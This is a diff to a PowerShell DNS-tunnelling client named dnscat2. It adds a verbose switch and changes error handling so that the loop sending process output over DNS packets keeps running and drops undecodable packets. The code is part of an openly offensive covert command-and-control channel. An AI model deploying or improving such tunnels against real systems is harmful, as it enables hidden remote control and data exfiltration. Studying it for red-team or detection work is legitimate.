@@ -5,7 +5,8 @@ function dnscat2
     [alias("p")][ValidateRange(1,65535)][int32]$DNSPort=53,
     [alias("dns")][string]$Domain="",
     [alias("e")][string]$Exec="",
-    [alias("h")][switch]$Help=$False
+    [alias("h")][switch]$Help=$False,
+    [alias("v")][switch]$Verbose=$False
   )
 
   if($Help)
@@ -182,16 +183,15 @@ dnscat2: Powershell Version
   $SessionId = Generate_Random
   $SequenceNumber = Generate_Random
   $DecodedPacket = DecodePacket (SendPacket (CreatePacket_SYN $SessionId $SequenceNumber $Options))
-  if($DecodedPacket -eq 1){return "Failure with decoding packet."}
+  if($DecodedPacket -eq 1){return "Bad SYN response. Ensure your server is set up correctly."}
   $ReturningData = $DecodedPacket[1]
   $AcknowledgementNumber = $DecodedPacket[2]
-  $Failure = $False
   $MaxMSGDataSize = (250 - (CreatePacket_MSG $SessionId $SequenceNumber $AcknowledgementNumber "").Length)
   if($MaxMSGDataSize -le 0){return "Domain name is too long."}
   
   try
   {
-    while(!$Failure)
+    while($True)
     {
       $InputData = GetInputData $StdOutReadOperation $StdOutDestinationBuffer $StdErrReadOperation $StdErrDestinationBuffer
       $StdOutReadOperation = $InputData[1]
@@ -232,16 +232,22 @@ dnscat2: Powershell Version
       {
         $PacketsData = @("0000")
       }
-
+      
       $ReturningData = ""
       foreach($PacketData in $PacketsData)
       {
-        try{$DecodedPacket = (DecodePacket (SendPacket (CreatePacket_MSG $SessionId $SequenceNumber $AcknowledgementNumber $PacketData)))}
-        catch{$Failure = $True}
-        if($DecodedPacket -eq 1){$Failure = $True}
-        $AcknowledgementNumber = $DecodedPacket[2]
-        $SequenceNumber = $DecodedPacket[3]
-        $ReturningData += $DecodedPacket[1]
+        try{$Packet = (SendPacket (CreatePacket_MSG $SessionId $SequenceNumber $AcknowledgementNumber $PacketData))}
+        catch{ Write-Host "HOST: Failed to send packet." }
+        try
+        {
+          $DecodedPacket = (DecodePacket $Packet)
+          if($DecodedPacket.Length -ne 4){ Write-Host "HOST: Failure to decode packet, dropping..."; continue }
+          $AcknowledgementNumber = $DecodedPacket[2]
+          $SequenceNumber = $DecodedPacket[3]
+          $ReturningData += $DecodedPacket[1]
+        }
+        catch{ Write-Verbose "HOST: Failure to decode packet, dropping..." }
+        if($DecodedPacket -eq 1){ Write-Verbose "HOST: Failure to decode packet, dropping..." }
       }
       
       if($ReturningData -ne "")
